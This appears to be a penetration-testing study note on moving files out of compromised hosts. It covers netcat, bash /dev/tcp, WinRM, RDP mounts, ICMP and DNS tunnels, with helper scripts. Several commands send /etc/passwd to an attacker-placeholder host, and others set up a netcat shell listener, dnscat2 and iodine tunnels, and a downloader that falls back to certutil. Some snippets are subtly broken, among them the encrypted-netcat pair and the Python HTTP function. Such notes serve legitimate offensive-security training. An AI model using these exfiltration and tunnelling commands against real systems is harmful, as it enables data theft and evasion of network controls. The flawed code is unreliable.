---
tags: [module/file-transfers, netcat, ncat, powershell-remoting, winrm, rdp, icmp, dns, automation, level/advanced, practical]
---

# Miscellaneous File Transfer Methods - Practical Application

## Complete Miscellaneous Transfer Workflow

Phase 1: Netcat/Ncat Deep Dive
Phase 2: Bash /dev/tcp Techniques
Phase 3: PowerShell Remoting (WinRM)
Phase 4: RDP File Transfer
Phase 5: ICMP Exfiltration
Phase 6: DNS Tunneling
Phase 7: Automation

---

## Phase 1: Netcat/Ncat Deep Dive

### Netcat Installation

# Debian/Ubuntu
apt install netcat-openbsd -y

# RHEL/CentOS
yum install nc -y

# Windows
# Download from https://joncraton.org/blog/46/netcat-for-windows/

### Netcat File Transfer Variations

# Send file with progress indicator (using pv)
tar cf - /etc | pv | nc -lvnp 4444

# Receive with progress
nc -lvnp 4444 | pv | tar xf -

# Encrypt netcat transfer (using openssl)
# On receiver
openssl enc -aes-256-cbc -pass pass:secret | nc -lvnp 4444 > received.enc

# On sender
nc -lvnp 4444 | openssl enc -d -aes-256-cbc -pass pass:secret | tar xf -

### Ncat Advanced Features

# SSL encrypted transfer
# Server (receiver)
ncat --ssl -lvnp 4444 --recv-only > received_file

# Client (sender)
ncat --ssl --send-only SERVER-IP 4444 < file_to_send

# With proxy
ncat --proxy proxy:8080 --proxy-type http --ssl -v TARGET 4444

# Connection brokering (multiple clients)
ncat --broker --listen -p 4444

# Limit transfer rate
ncat --send-only --rate-limit 100k TARGET 4444 < largefile.iso

### Netcat Reverse File Transfer (Through Firewall)

# On your machine (wait for connection)
nc -lvnp 4444 -e /bin/sh

# On target (connect and send file)
nc YOUR-IP 4444 < /etc/passwd

### Netcat with UDP

# Server (UDP)
nc -l -u -p 4444 > received_file

# Client (UDP)
nc -u TARGET-IP 4444 < file_to_send

---

## Phase 2: Bash /dev/tcp Techniques

### Bash File Download Function

function bash_download() {
    local host=$1
    local port=$2
    local path=$3
    local output=$4
    
    exec 3<>/dev/tcp/$host/$port
    echo -e "GET $path HTTP/1.1\nHost: $host\nConnection: close\n\n" >&3
    # Skip HTTP headers
    while IFS= read -r line; do
        [[ "$line" == $'\r' ]] && break
    done <&3
    # Save body to file
    cat <&3 > "$output"
    exec 3>&-
}

# Usage
bash_download 10.10.14.5 80 /file.exe downloaded.exe

### Bash Upload Function

function bash_upload() {
    local host=$1
    local port=$2
    local file=$3
    
    exec 3<>/dev/tcp/$host/$port
    # Send HTTP POST with file
    {
        echo "POST /upload HTTP/1.1"
        echo "Host: $host"
        echo "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary"
        echo "Content-Length: $(wc -c < $file)"
        echo ""
        cat "$file"
    } >&3
    
    # Read response
    cat <&3
    exec 3>&-
}

# Usage
bash_upload 10.10.14.5 8000 /etc/passwd

### Bash Port Scanner with /dev/tcp

for port in {1..1024}; do
    (echo >/dev/tcp/localhost/$port) 2>/dev/null && echo "$port open"
done

### Bash Reverse Shell with File Transfer

# On your machine
nc -lvnp 4444

# On target
exec 5<>/dev/tcp/YOUR-IP/4444
cat /etc/passwd >&5
echo "END_OF_FILE" >&5
exec 5>&-

---

## Phase 3: PowerShell Remoting (WinRM) Deep Dive

### Check WinRM Configuration

# Check if WinRM is enabled
Get-Service WinRM
winrm enumerate winrm/config/listener

# Test connectivity
Test-WSMan -ComputerName TARGET
Test-NetConnection -ComputerName TARGET -Port 5985

### Create Persistent PSSession

$Session = New-PSSession -ComputerName TARGET -Credential (Get-Credential)

# List sessions
Get-PSSession

# Enter interactive session
Enter-PSSession -Session $Session

### Advanced Copy-Item with Sessions

# Copy entire directory recursively
Copy-Item -Path C:\Tools\* -ToSession $Session -Destination C:\Temp\ -Recurse

# Copy with credentials
$cred = Get-Credential
Copy-Item -Path file.txt -ToSession (New-PSSession -ComputerName TARGET -Credential $cred) -Destination C:\Temp\

# Copy multiple files
$files = @("file1.exe", "file2.dll", "script.ps1")
$files | ForEach-Object {
    Copy-Item -Path $_ -ToSession $Session -Destination "C:\Temp\$_"
}

### Invoke-Command for File Transfer

# Transfer file using Invoke-Command (no Copy-Item)
Invoke-Command -Session $Session -ScriptBlock {
    $content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.exe"))
    $content
} | Out-File -Encoding ascii file.b64

# Decode on local machine
[System.IO.File]::WriteAllBytes("file.exe", [System.Convert]::FromBase64String((Get-Content file.b64 -Raw)))

### WinRM File Transfer Without Sessions

# Using Invoke-Command directly
Invoke-Command -ComputerName TARGET -ScriptBlock {
    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.exe"))
} -Credential (Get-Credential) | Out-File file.b64

---

## Phase 4: RDP File Transfer

### Advanced xfreerdp Options

# Mount drive with specific name
xfreerdp /v:TARGET /u:user /p:pass +drive:share,/local/path

# Mount multiple drives
xfreerdp /v:TARGET /u:user /p:pass +drive:data,/data +drive:tools,/tools

# With smartcard and clipboard
xfreerdp /v:TARGET /u:user /p:pass +drives +clipboard

# Using RDP gateway
xfreerdp /v:TARGET /g:GATEWAY:443 /u:user /p:pass /drive:share,/local

### rdesktop Mount Options

# Mount with permissions
rdesktop TARGET -u user -p pass -r disk:share=/local:allow

# Multiple mounts
rdesktop TARGET -r disk:data=/data -r disk:tools=/tools

### PowerShell Copy from RDP Session

# If you have RDP but no file transfer, use PowerShell
# On target (in RDP)
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.exe"))

# Copy the base64 string (using RDP clipboard)
# On your machine
[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String("BASE64-STRING"))

### Automated RDP File Transfer Script

Save as rdp-transfer.sh:

#!/bin/bash
TARGET=$1
USER=$2
PASS=$3
LOCAL_DIR=$4
REMOTE_NAME=$5

# Start RDP with mounted drive
xfreerdp /v:$TARGET /u:$USER /p:$PASS +drive:$REMOTE_NAME,$LOCAL_DIR &

RDP_PID=$!

echo "[*] RDP session started. Copy files to \\\\tsclient\\$REMOTE_NAME"
echo "[*] Press Enter when done to close RDP"
read

kill $RDP_PID

---

## Phase 5: ICMP Exfiltration

### ICMP Tunnel with ping

# On your machine (receiver)
sudo tcpdump -i eth0 icmp -w icmp.pcap

# On target (sender)
# Encode file to hex and send in ping packets
for chunk in $(xxd -p -c 32 /etc/passwd); do
    ping -p $chunk -c 1 YOUR-IP
    sleep 0.1
done

### ICMP Data Extraction

# Extract data from pcap
tcpdump -r icmp.pcap -n -v | grep "icmp" | grep -oP "0x[0-9a-f]+" | xxd -r -p > received_file

### Using ptunnel (ICMP Tunnel)

# Server (your machine)
ptunnel -v

# Client (target)
ptunnel -p YOUR-IP -lp 8000 -da TARGET -dp 22

# Now connect via SSH through tunnel
ssh -p 8000 localhost

---

## Phase 6: DNS Tunneling

### DNS Tunnel with dnscat2

# Server (your machine)
ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=yourdomain.com

# Client (target)
./dnscat2-v0.07-client32.exe --dns server=yourdomain.com

# Once connected, use 'download' command to transfer files

### DNS Tunnel with iodine

# Server (your machine)
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# Client (target)
iodine -f -P password tunnel.yourdomain.com

# Now transfer files via the tunnel (10.0.0.2 is client IP)
scp file root@10.0.0.2:/tmp/

### DNS TXT Record File Transfer

# On your machine (create TXT record)
# Split file into DNS-friendly chunks
split -b 60 file.bin chunk_
for c in chunk_*; do
    echo -n "$(cat $c | base64 -w0)" | dig +short TXT $c.yourdomain.com
done

# On target (retrieve chunks)
for i in {1..10}; do
    dig +short TXT chunk_$i.yourdomain.com | base64 -d >> received_file
done

---

## Phase 7: Automation

### Universal File Transfer Script (Bash)

Save as universal-transfer.sh:

#!/bin/bash
# Universal file transfer script

TARGET=$1
PORT=$2
FILE=$3
MODE=$4  # send or receive

function netcat_transfer() {
    if [ "$MODE" == "send" ]; then
        if command -v ncat &>/dev/null; then
            ncat --send-only $TARGET $PORT < $FILE
        else
            nc -q 0 $TARGET $PORT < $FILE
        fi
    else
        if command -v ncat &>/dev/null; then
            ncat -l -p $PORT --recv-only > $FILE
        else
            nc -l -p $PORT > $FILE
        fi
    fi
}

function bash_transfer() {
    if [ "$MODE" == "send" ]; then
        exec 3<>/dev/tcp/$TARGET/$PORT
        cat $FILE >&3
        exec 3>&-
    else
        cat < /dev/tcp/$TARGET/$PORT > $FILE
    fi
}

# Try netcat first
if command -v nc &>/dev/null || command -v ncat &>/dev/null; then
    netcat_transfer
else
    bash_transfer
fi

### PowerShell Universal Download Script

Save as universal-download.ps1:

param(
    [string]$url,
    [string]$output
)

$methods = @(
    { (New-Object Net.WebClient).DownloadFile($url, $output) },
    { Invoke-WebRequest -Uri $url -OutFile $output },
    { Start-BitsTransfer -Source $url -Destination $output },
    { certutil -urlcache -f $url $output }
)

foreach ($method in $methods) {
    try {
        & $method
        Write-Host "[+] Success" -ForegroundColor Green
        return
    } catch {
        Write-Host "[-] Method failed" -ForegroundColor Red
    }
}

### Multi-Protocol Transfer Script

Save as multi-transfer.py:

#!/usr/bin/env python3
import sys
import os
import socket
import base64

def transfer_netcat(host, port, data, send=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if send:
        s.connect((host, port))
        s.send(data)
        s.close()
    else:
        s.bind((host, port))
        s.listen(1)
        conn, addr = s.accept()
        data = conn.recv(4096)
        conn.close()
        return data

def transfer_http(host, port, path, send=True):
    import urllib.request
    if send:
        # HTTP POST
        req = urllib.request.Request(f"http://{host}:{port}{path}", data=data, method="POST")
        urllib.request.urlopen(req)
    else:
        # HTTP GET
        data = urllib.request.urlopen(f"http://{host}:{port}{path}").read()
        return data

def main():
    if len(sys.argv) < 4:
        print("Usage: script.py <host> <port> <file> [send|receive] [method]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    file = sys.argv[3]
    mode = sys.argv[4] if len(sys.argv) > 4 else "receive"
    method = sys.argv[5] if len(sys.argv) > 5 else "netcat"
    
    if mode == "send":
        with open(file, 'rb') as f:
            data = f.read()
    else:
        data = None
    
    if method == "netcat":
        result = transfer_netcat(host, port, data, mode=="send")
    elif method == "http":
        result = transfer_http(host, port, "/upload", mode=="send")
    else:
        print(f"Unknown method: {method}")
        sys.exit(1)
    
    if mode == "receive" and result:
        with open(file, 'wb') as f:
            f.write(result)
        print(f"[+] Received {len(result)} bytes")

if __name__ == "__main__":
    main()

---

## Miscellaneous Transfer Cheatsheet

| Method | Command (Send) | Command (Receive) |
|--------|----------------|-------------------|
| Netcat | nc -q 0 TARGET 4444 < file | nc -l -p 4444 > file |
| Ncat | ncat --send-only TARGET 4444 < file | ncat -l -p 4444 --recv-only > file |
| Ncat SSL | ncat --ssl --send-only TARGET 4444 < file | ncat --ssl -l -p 4444 --recv-only > file |
| Bash /dev/tcp | cat file > /dev/tcp/TARGET/4444 | cat < /dev/tcp/TARGET/4444 > file |
| PowerShell Remoting | Copy-Item -Path file -ToSession $sess -Destination C:\ | Copy-Item -Path C:\file -FromSession $sess -Destination . |
| RDP mount | xfreerdp /drive:share,/path | Access \\tsclient\share |
| ICMP | ping -p hex-data TARGET | tcpdump -i eth0 icmp -w capture.pcap |
| DNS | dig +short TXT domain.com | Create TXT records |

---

## Key Takeaways

- Netcat is the universal fallback - master it
- Ncat adds SSL, proxies, and connection brokering
- Bash /dev/tcp works when Netcat isn't installed
- PowerShell Remoting (WinRM) is powerful on Windows networks
- RDP drive mounting enables easy large transfers
- ICMP and DNS tunnels work when everything else is blocked
- Always have multiple methods ready
- Test what's allowed (ports, protocols) before committing
- Automate with scripts for efficiency
- Practice all methods in labs until they're muscle memory
- The more you know, the less likely you'll get stuck
- These techniques appear throughout the HTB Penetration Tester path
